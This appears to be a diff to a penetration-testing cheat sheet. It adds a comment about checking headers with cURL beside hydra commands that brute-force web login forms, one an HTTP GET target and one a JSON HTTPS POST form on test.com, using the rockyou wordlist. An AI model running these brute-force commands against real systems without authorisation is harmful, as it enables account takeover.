@@ -63,6 +63,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get
 
 ```
 #Content-Type、Accept、Origin、X-Requested-With、Referer and CSRF checks、Cookies
+#use cURL to check necessary headers
 hydra -l admin -P ~/Documents/rockyou.txt test.com https-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Origin\: https\://test.com:H=Accept\: application/json, text/plain, */*:H=Content-Type\: application/json;charset=utf-8"
 ```
 
